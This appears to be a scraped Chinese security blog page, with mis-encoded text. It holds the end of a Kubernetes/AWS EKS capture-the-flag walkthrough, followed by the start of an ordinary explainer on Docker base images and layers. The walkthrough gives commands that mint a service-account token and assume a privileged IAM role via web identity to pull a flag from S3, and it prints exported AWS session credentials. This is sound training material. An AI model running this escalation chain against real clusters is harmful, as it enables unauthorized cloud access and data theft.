<h4 id="5-2-Trustç­–ç•¥"><a href="#5-2-Trustç­–ç•¥" class="headerlink" title="5.2 Trustç­–ç•¥"></a>5.2 Trustç­–ç•¥</h4><p>å…è®¸ä½¿ç”¨webèº«ä»½éªŒè¯ï¼šå…è®¸äº†k8sä¸­ä½¿ç”¨IAMè§’è‰²è¿›è¡Œwebèº«ä»½éªŒè¯</p>
<p>æŒ‡å®šäº†ç”Ÿæ•ˆæ¡ä»¶ï¼š</p>
<p>OIDCæä¾›ç¨‹åºä¸­çš„JWTçš„audienceå­—æ®µå¿…é¡»ä¸ºsts.amazonaws.com</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Federated&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringEquals&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;</span>: <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-3-Permissionç­–ç•¥"><a href="#5-3-Permissionç­–ç•¥" class="headerlink" title="5.3 Permissionç­–ç•¥"></a>5.3 Permissionç­–ç•¥</h4><p>secretsï¼šå…è®¸åˆ—å‡ºå’Œè·å–</p>
<p>serviceaccountsï¼šå…è®¸åˆ—å‡ºå’Œè·å–</p>
<p>podsï¼šå…è®¸åˆ—å‡ºå’Œè·å–</p>
<p>serviceaccounts&#x2F;tokenï¼šå…è®¸åˆ›å»º</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts/token&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-4-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"><a href="#5-4-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™" class="headerlink" title="5.4 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>5.4 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h4><p>æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç‚¹ï¼šæˆ‘ä»¬åªèƒ½ä¸ºdebug-saåˆ›å»ºtokenï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸€ä¸ªçªç ´å£</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203431104.png" alt="image-20231228203431104"></p>
<h4 id="5-5-æŸ¥çœ‹é›†ç¾¤ä¸­å¯ç”¨çš„ä¿¡æ¯"><a href="#5-5-æŸ¥çœ‹é›†ç¾¤ä¸­å¯ç”¨çš„ä¿¡æ¯" class="headerlink" title="5.5 æŸ¥çœ‹é›†ç¾¤ä¸­å¯ç”¨çš„ä¿¡æ¯"></a>5.5 æŸ¥çœ‹é›†ç¾¤ä¸­å¯ç”¨çš„ä¿¡æ¯</h4><p>æŸ¥çœ‹pod</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203726812.png" alt="image-20231228203726812"></p>
<p>æŸ¥çœ‹serviceaccount</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203746071.png" alt="image-20231228203746071"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">a</span> <span class="string">dummy</span> <span class="string">service</span> <span class="string">account</span> <span class="string">with</span> <span class="string">empty</span> <span class="string">policy</span> <span class="string">attached</span></span><br><span class="line">      <span class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:37Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">debug-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671929&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">6cb6024a-c4da-47a9-9050-59c8c7079904</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:11Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671804&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">77bd3db6-3642-40d5-b8c1-14fa1b0cba8c</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeEksS3Role</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:34Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">s3access-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671916&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">86e44c49-b05a-4ebe-800b-45183a6ebbda</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹secrets</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203814364.png" alt="image-20231228203814364"></p>
<p>ä»ä¸Šè¿°æœåŠ¡å¸æˆ·å¾—å‡ºçš„ç»“æœï¼Œ</p>
<p>- é™„åŠ åˆ° SAâ€œdebug-saâ€çš„ IAM è§’è‰²æ˜¯challengeTestRole-fc9d18e</p>
<p>- é™„åŠ åˆ° SA â€œs3access-saâ€çš„IAMè§’è‰²æ˜¯challengeEksS3Role</p>
<p>åªå…è®¸ä¸ºâ€œdebug-saâ€åˆ›å»ºtokenï¼ˆé€šè¿‡è¿è¡Œâ€œkubectl auth can-i â€” listâ€æ¥è¯†åˆ«ï¼‰ï¼Œå¹¶ä¸”éœ€è¦æ‰¿æ‹…challengeEksS3Roleæ¥è·å–æˆ‘ä»¬çš„flagï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡webèº«ä»½éªŒè¯çš„æ–¹å¼æ¥åˆ›å»ºã€‚</p>
<h4 id="5-6-ä¸ºdebug-saåˆ›å»ºtokenå¹¶è·å–æƒé™"><a href="#5-6-ä¸ºdebug-saåˆ›å»ºtokenå¹¶è·å–æƒé™" class="headerlink" title="5.6 ä¸ºdebug-saåˆ›å»ºtokenå¹¶è·å–æƒé™"></a>5.6 ä¸ºdebug-saåˆ›å»ºtokenå¹¶è·å–æƒé™</h4><p>åˆ›å»ºtokenï¼ˆæ³¨æ„è¿™é‡Œéœ€è¦æŒ‡å®šaudienceä¹‹å‰æœ‰æåˆ°ï¼Œè¿™æ˜¯ç­–ç•¥ç”Ÿæ•ˆçš„å‰æï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugsatoken=$(kubectl create token debug-sa --audience=sts.amazonaws.com)</span><br></pre></td></tr></table></figure>

<p>è®¾ç½® AWS CLI webèº«ä»½éªŒè¯ï¼ˆæ³¨æ„è¿™é‡Œçš„IAMè§’è‰²éœ€è¦æŒ‡å®šä¸ºchallengeEksS3Roleï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --web-identity-token $debugsatoken --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name hacked</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆæ ¹æ®ä¸Šä¸€æ¡æŒ‡ä»¤è¿”å›çš„ç»“æœï¼‰</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXISURJO2</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=xYjl4N8DiuiBQY8wlndh7nJESeg/oUHFxVfJbBcw</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMSJGMEQCIEQzKvzrEE3D62jc+bkhhI4gzyYYHoeuZkFrDXCdL44XAiB78MAlAbk5MpTlgoioZF4QD2GOIeJ05XlWuiAoVRy03SrABAi+//////////8BEAAaDDY4ODY1NTI0NjY4MSIMrgWnIMgZ8Q4Kg+sWKpQEUhXDLq0Yu3DPW/TemlVwpSu2BBKFUNNV7d+xgJk6DqCd6YcryXyyW1jAl5ycf6tWQiUTq6M8nadEE1piS2Uafl8laOpMvPnykVqrtIsb0Du6lDDIPssHBmqDn8b682FqxOI8Yo4HfpnsXCxDV655k94An5ilkDaZ7+YKo3Vn++ovr/ntm2HkCc8l2cCm2kmkWxIa8+qmymHe2rDecq368nd2MDD0XjDFMoXJZswgHSCPpT98/rXXC1BaSazivslVNispb6CgQe5e7IBAA0ggp3rKvzmfiWkMLqh5+Bd3cbqjl/4Jf7UzjthaWmhpX3Fz/4XooJQYmFP7gchyD8epb8g7KT2umN0/gqvSw2JzFHn9pSexjPo3npyMkbaKR3Z0fmidCaMx5+rmiVsDp/S+QtSXe/pFV6RMlJLXlFFICp9fjQ4L1bEBJFJqJrUSfIKIm5V7JvgThSsuXrd6OnZMGSqOUUjPD9v0cRrz3BpT7vRdMDJRJ8eqze0/Z90Z38Z1in7bG6QHPzoBmqmGnPH9+5L363DXQo1r4HWdQM8ZZqbVCRItUlLXdpaVTjiR4I0P6pZrrUjPFtxG/Vju6UwDdeTqqGsp11j/hTItPKwE5TNT0Ey/rdBxgFhgqIV3jdjqxpGOqLd8KE8ID7er9Bx9KazY2oTsFURG3vdoQ0cpnsE2aa84/4vvWZ1/TYgQtPD579G+8jC33rWsBjqWAfBIVjz4k5/bvDn+imLRw7fC93ko49up5DTj+wJYPmHUSZpYo1RhGzxFU1iemWTbI2VnuEiEf1x/UKp+RmbahEiFyvnuUglSOK/+/x2IGTSWPZC+yo1uXNOzxOAS3A8GWvwr0DxaG1/r0ahZU2ZABw4kdt+WZRXcsIgGtW1Hg34mzoQhfTPzwfmSfltvPAv1DRKpArkk/g==</span><br></pre></td></tr></table></figure>

<h4 id="5-7-è·å–å­˜å‚¨bucketä¸­çš„flag"><a href="#5-7-è·å–å­˜å‚¨bucketä¸­çš„flag" class="headerlink" title="5.7 è·å–å­˜å‚¨bucketä¸­çš„flag"></a>5.7 è·å–å­˜å‚¨bucketä¸­çš„flag</h4><p>æŸ¥çœ‹æˆ‘çš„è§’è‰²</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMZEZ2AFVYI:hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/hacked&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://challenge-flag-bucket-3ff1ae2/flag .</span><br></pre></td></tr></table></figure>

<h2 id="6-å‚è€ƒæ–‡çŒ®"><a href="#6-å‚è€ƒæ–‡çŒ®" class="headerlink" title="6. å‚è€ƒæ–‡çŒ®"></a>6. å‚è€ƒæ–‡çŒ®</h2><p><a target="_blank" rel="noopener" href="https://blog.aquasec.com/the-ticking-supply-chain-attack-bomb-of-exposed-kubernetes-secrets">æš´éœ²kubernetesç§˜å¯†çš„æ»´ç­”ä½œå“çš„ä¾›åº”é“¾æ”»å‡»ç‚¸å¼¹</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/379293478">æµ…è°ˆäº‘ä¸Šæ”»é˜²ä¹‹-å…ƒæ•°æ®æœåŠ¡å¸¦æ¥çš„å®‰å…¨æŒ‘æˆ˜</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/andresriancho/enumerate-iam/tree/master">awsçš„iamæƒé™æ¢æµ‹è„šæœ¬</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 3975 words, 13 min 15 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/11/27/%E5%9F%BA%E7%A1%80%E9%95%9C%E5%83%8F/">åŸºç¡€é•œåƒ</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg" alt="img"></a></p>
<h1 id="ä¸€ã€ç ”ç©¶è°ƒç ”"><a href="#ä¸€ã€ç ”ç©¶è°ƒç ”" class="headerlink" title="ä¸€ã€ç ”ç©¶è°ƒç ”"></a>ä¸€ã€ç ”ç©¶è°ƒç ”</h1><h2 id="1-1-è°ƒç ”å·¥ä½œ"><a href="#1-1-è°ƒç ”å·¥ä½œ" class="headerlink" title="1.1 è°ƒç ”å·¥ä½œ"></a>1.1 è°ƒç ”å·¥ä½œ</h2><h3 id="ä»€ä¹ˆæ˜¯åŸºç¡€é•œåƒï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åŸºç¡€é•œåƒï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸºç¡€é•œåƒï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åŸºç¡€é•œåƒï¼Ÿ</h3><p>åŸºç¡€é•œåƒæ˜¯ Docker é•œåƒçš„èµ·ç‚¹ï¼Œå®ƒæ˜¯ä¸€ä¸ªåªè¯»çš„æ–‡ä»¶ç³»ç»Ÿã€‚åŸºç¡€é•œåƒé€šå¸¸åŒ…å«äº†ä¸€ä¸ªæœ€å°åŒ–çš„æ“ä½œç³»ç»Ÿï¼Œä»¥åŠä¸€äº›é¢„è£…çš„åŸºç¡€è½¯ä»¶åŒ…ã€‚Docker Hub æä¾›äº†è®¸å¤šå¸¸ç”¨çš„åŸºç¡€é•œåƒï¼Œå¦‚ Ubuntuã€Alpine ç­‰ã€‚è¿™äº›é•œåƒæ˜¯ç”± Docker å®˜æ–¹æˆ–ç¤¾åŒºç»´æŠ¤çš„ï¼Œå¯ä»¥åœ¨ Docker Hub ä¸Šè‡ªç”±è·å–å’Œä½¿ç”¨ã€‚</p>
<h3 id="æ‰‹åŠ¨æŸ¥çœ‹åŸºç¡€é•œåƒ"><a href="#æ‰‹åŠ¨æŸ¥çœ‹åŸºç¡€é•œåƒ" class="headerlink" title="æ‰‹åŠ¨æŸ¥çœ‹åŸºç¡€é•œåƒ"></a>æ‰‹åŠ¨æŸ¥çœ‹åŸºç¡€é•œåƒ</h3><ul>
<li><p>æŸ¥çœ‹docker history</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> calico/cni:v3.13.1</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image3.png" alt="image3"></p>
</li>
<li><p>æŸ¥çœ‹docker inspect</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 6912ec2cfae6</span><br></pre></td></tr></table></figure>

<p>æœ‰éƒ¨åˆ†é•œåƒä¼šåœ¨labelä¸­å†™å‡ºåŸºç¡€é•œåƒï¼Œä½†æœ‰çš„æ²¡æœ‰</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image2.jpg" alt="image2"></p>
<p>æœ‰éƒ¨åˆ†é•œåƒä¼šåœ¨parentä¸­å†™å‡ºåŸºç¡€é•œåƒï¼Œä½†æœ‰çš„æ²¡æœ‰</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image1.png" alt="image1"></p>
</li>
</ul>
<h3 id="layerså‘ç°åŸºç¡€é•œåƒçš„æ–¹æ³•"><a href="#layerså‘ç°åŸºç¡€é•œåƒçš„æ–¹æ³•" class="headerlink" title="layerså‘ç°åŸºç¡€é•œåƒçš„æ–¹æ³•"></a>layerså‘ç°åŸºç¡€é•œåƒçš„æ–¹æ³•</h3><p>Docker é•œåƒæ˜¯ç”±ä¸€ç³»åˆ—åªè¯»çš„æ–‡ä»¶ç³»ç»Ÿå±‚æ„æˆçš„ï¼Œè¿™äº›å±‚ä¼šæŒ‰ç‰¹å®šé¡ºåºå åŠ åœ¨ä¸€èµ·ï¼Œæ„æˆä¸€ä¸ªå®Œæ•´çš„é•œåƒã€‚é•œåƒå±‚çš„è®¾è®¡ä½¿å¾— Docker å…·æœ‰è½»é‡ã€é«˜æ•ˆå’Œå¯å¤ç”¨çš„ç‰¹æ€§ã€‚ä¸‹é¢æ˜¯ Docker é•œåƒå±‚æ„æˆçš„è¯¦ç»†ä»‹ç»ï¼š</p>
<ul>
<li>åŸºç¡€é•œåƒå±‚ï¼š</li>
</ul>
<p>Docker é•œåƒçš„ç¬¬ä¸€å±‚æ˜¯åŸºç¡€é•œåƒå±‚ï¼Œå®ƒé€šå¸¸åŒ…å«ä¸€ä¸ªæœ€å°åŒ–çš„æ“ä½œç³»ç»Ÿï¼Œå¦‚Alpine Linuxã€Ubuntuã€CentOSç­‰ã€‚è¿™ä¸ªåŸºç¡€é•œåƒæä¾›äº†è¿è¡Œåº”ç”¨ç¨‹åºæ‰€éœ€çš„æœ€åŸºæœ¬çš„æ–‡ä»¶å’Œå·¥å…·ã€‚åŸºç¡€é•œåƒé€šå¸¸æ˜¯å…¬å…±æˆ–ç§æœ‰çš„ï¼Œä¾›å…¶ä»–é•œåƒæ„å»ºå’Œæ‰©å±•ä½¿ç”¨ã€‚</p>
<ul>
<li>åº”ç”¨ç¨‹åºä¾èµ–å±‚ï¼š</li>
</ul>
<p>åœ¨åŸºç¡€é•œåƒä¹‹ä¸Šï¼ŒDocker å¯ä»¥æ·»åŠ åº”ç”¨ç¨‹åºçš„ä¾èµ–é¡¹å’Œè¿è¡Œæ—¶ç¯å¢ƒï¼Œè¿™äº›ä¾èµ–é¡¹å¯èƒ½åŒ…æ‹¬è½¯ä»¶åŒ…ã€åº“æ–‡ä»¶ç­‰ã€‚è¿™äº›å±‚ç”¨äºæ”¯æŒåº”ç”¨ç¨‹åºçš„æ‰§è¡Œå’Œè¿è¡Œæ‰€éœ€çš„è½¯ä»¶å’Œå·¥å…·ã€‚</p>
<ul>
<li>åº”ç”¨ç¨‹åºä»£ç å±‚ï¼š</li>
</ul>
<p>åœ¨ä¾èµ–å±‚ä¹‹ä¸Šï¼ŒDocker å¯ä»¥æ·»åŠ åº”ç”¨ç¨‹åºçš„å®é™…ä»£ç å’Œèµ„æºæ–‡ä»¶ã€‚è¿™äº›å±‚åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æºä»£ç ã€é…ç½®æ–‡ä»¶ã€é™æ€èµ„æºç­‰ã€‚è¿™ä½¿å¾— Docker é•œåƒèƒ½å¤Ÿå®Œæ•´åœ°åŒ…å«åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä»£ç ã€‚</p>
<ul>
<li>åªè¯»å±‚ï¼š</li>
</ul>
<p>é•œåƒçš„æ¯ä¸ªå±‚éƒ½æ˜¯åªè¯»çš„ï¼Œè¿™æ„å‘³ç€åœ¨æ„å»ºåï¼Œé•œåƒå±‚çš„å†…å®¹ä¸ä¼šå†æ”¹å˜ã€‚è¿™ç§è®¾è®¡æœ‰åŠ©äºé•œåƒçš„é«˜æ•ˆæ€§å’Œå¯å¤ç”¨æ€§ã€‚å¦‚æœéœ€è¦ä¿®æ”¹é•œåƒï¼ŒDocker å°†åœ¨ç°æœ‰å±‚ä¹‹ä¸Šåˆ›å»ºæ–°çš„é•œåƒå±‚ï¼Œä¿æŒåŸæœ‰å±‚çš„å®Œæ•´æ€§ã€‚</p>
<ul>
<li>å…±äº«ç›¸åŒå±‚ï¼š</li>
</ul>
<p>å½“å¤šä¸ªé•œåƒå…±äº«ç›¸åŒçš„åŸºç¡€å±‚æ—¶ï¼Œå®ƒä»¬å¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´å’Œä¸‹è½½æ—¶é—´ã€‚å› ä¸ºè¿™äº›é•œåƒåªéœ€åœ¨è‡ªå·±çš„ç‰¹å®šå±‚ä¸Šæ·»åŠ å·®å¼‚å±‚ï¼Œè€Œä¸æ˜¯å¤åˆ¶æ•´ä¸ªåŸºç¡€é•œåƒã€‚è¿™ä½¿å¾—é•œåƒçš„å­˜å‚¨å’Œä¼ è¾“å˜å¾—æ›´åŠ é«˜æ•ˆã€‚</p>
<ul>
<li>é•œåƒçš„å”¯ä¸€æ ‡è¯†ï¼š</li>
</ul>
<p>æ¯ä¸ªé•œåƒéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œç§°ä¸ºé•œåƒ IDï¼Œå®ƒæ˜¯æ ¹æ®é•œåƒå†…å®¹ç”Ÿæˆçš„å“ˆå¸Œå€¼ã€‚é•œåƒ ID æ˜¯æ ¹æ®æ‰€æœ‰é•œåƒå±‚çš„å†…å®¹è®¡ç®—å¾—å‡ºçš„ï¼Œå³ä½¿ä¸€ä¸ªé•œåƒåªæœ‰ä¸€ä¸ªå°çš„æ”¹åŠ¨ï¼Œå®ƒçš„é•œåƒ ID ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™ç§ç‰¹æ€§æœ‰åŠ©äºç¡®ä¿é•œåƒçš„å”¯ä¸€æ€§å’Œæ•°æ®çš„å®Œæ•´æ€§ã€‚</p>
<h4 id="æŸ¥çœ‹docker-historyä¸­æœ€ä¸‹æ–¹æ·»åŠ çš„fileä¿¡æ¯"><a href="#æŸ¥çœ‹docker-historyä¸­æœ€ä¸‹æ–¹æ·»åŠ çš„fileä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹docker historyä¸­æœ€ä¸‹æ–¹æ·»åŠ çš„fileä¿¡æ¯"></a>æŸ¥çœ‹docker historyä¸­æœ€ä¸‹æ–¹æ·»åŠ çš„fileä¿¡æ¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> runctaoyi:v1.0 --no-trunc</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/layer2.png" alt="layer2"></p>
<h4 id="æŸ¥çœ‹docker-hubä¸­å¯¹åº”fileä¿¡æ¯"><a href="#æŸ¥çœ‹docker-hubä¸­å¯¹åº”fileä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹docker hubä¸­å¯¹åº”fileä¿¡æ¯"></a>æŸ¥çœ‹docker hubä¸­å¯¹åº”fileä¿¡æ¯</h4><p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/dockerhub.png" alt="dockerhub"></p>
<h3 id="å¯»æ‰¾å®¿ä¸»æœºä¸­é•œåƒå®é™…æ–‡ä»¶ç³»ç»Ÿ"><a href="#å¯»æ‰¾å®¿ä¸»æœºä¸­é•œåƒå®é™…æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="å¯»æ‰¾å®¿ä¸»æœºä¸­é•œåƒå®é™…æ–‡ä»¶ç³»ç»Ÿ"></a>å¯»æ‰¾å®¿ä¸»æœºä¸­é•œåƒå®é™…æ–‡ä»¶ç³»ç»Ÿ</h3><p><strong>layerIDï¼š</strong></p>
<p>å‹ç¼©åçš„å“ˆå¸Œï¼Œå’ŒdiffIDæœ‰ä¸€ä¸€æ˜ å°„å…³ç³»</p>
<p><strong>diffIDï¼š</strong></p>
<p>è§£å‹ç¼©åçš„å“ˆå¸Œï¼Œä½¿ç”¨docker inspectå¯ä»¥æŸ¥çœ‹åˆ°</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file.png" alt="file"></p>
